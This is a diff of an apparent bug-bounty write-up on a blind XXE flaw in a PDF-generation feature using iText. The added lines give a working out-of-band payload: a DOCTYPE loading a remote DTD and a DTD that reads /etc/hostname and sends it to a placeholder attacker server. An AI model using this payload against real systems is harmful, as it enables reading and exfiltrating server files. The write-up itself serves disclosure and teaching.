@@ -71,15 +71,27 @@ So yeah, it was in fact a vulnerable iText version to XXE, BUT, that version of 
 
 Due to the nature of the feature, no direct feedback was available after every upload, therefore an error based XXE was not possible, so I had to go with the Blind route using Out-of-Band attacks to try to exfiltrate internal information.
 
-The XML parser didn't parse regular external entities so I had to try different variations of External Parameter entities. After some trial and error I came up with a working payload:
+I had to try different variations of External Parameter entities (an entity referenced inside the DTD). After some trial and error I came up with a working payload: 
 
-```html
-<!DOCTYPE root [ <!ENTITY % ext SYSTEM "https://<attacker-server>/poc.dtd">
+```xml
+<!DOCTYPE root [ <!ENTITY % ext SYSTEM "https://attacker-server/poc.dtd">
 %ext;
 %ent;
 ]>
 <root>&data;</root>
 ```
+
+Content of the malicious DTD (poc.dtd):
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
+```
+
+Here's the breakout from all of this:
+
+
+
 
 
 
